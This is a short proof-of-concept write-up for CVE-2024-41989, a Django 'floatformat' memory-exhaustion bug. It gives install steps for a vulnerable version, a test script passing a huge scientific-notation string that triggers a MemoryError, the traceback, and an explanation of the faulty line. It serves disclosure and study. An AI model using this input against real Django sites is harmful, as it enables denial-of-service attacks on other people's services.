# CVE-2024-41989

## Description

A security issue was found in Django. If 'floatformat' received a string representation of a number in scientific notation with a large exponent, it could lead to significant memory consumption. To avoid this, decimals with more than 200 digits are now returned as is.

## Exploit

1. Install python and pip
2. Install Django 5.0 before 5.0.8 and 4.2 before 4.2.15 
   ```sh
   pip install Django==5.0
   ```
3. Create new python file, test with this script
    ```py
    from django.template.defaultfilters import *

    # A string representation of a number in scientific notation with a large exponent
    num = "10e10000000000000000"
    print("Run -> Error")
    floatformat(num)
    print("Done!")
    ```
4. Error return 
    ```sh
    Run -> Error
    Traceback (most recent call last):
    File "/home/frenda/code/hhack/test/test.py", line 6, in <module>
        floatformat(num)
    File "/home/frenda/.local/lib/python3.12/site-packages/django/template/defaultfilters.py", line 167, in floatformat
        m = int(d) - d
            ^^^^^^
    MemoryError
    ```

### Explain

- The line `m = int(d) - d` cause the issue. 
- The variable `d` is a `decimal.Decimal` object 
  - `d = Decimal(str(float(text)))`, casting from user input
  - Take a look at `.local/lib/python3.12/site-packages/django/template/defaultfilters.py`
- Casting `d` object to python `Decimal` is costly when the `text` contains scientific notation like `"10e10000000000000000"`
- The attacker can use that to cause a issue.

---

Fixed with latest Django version `5.1.2`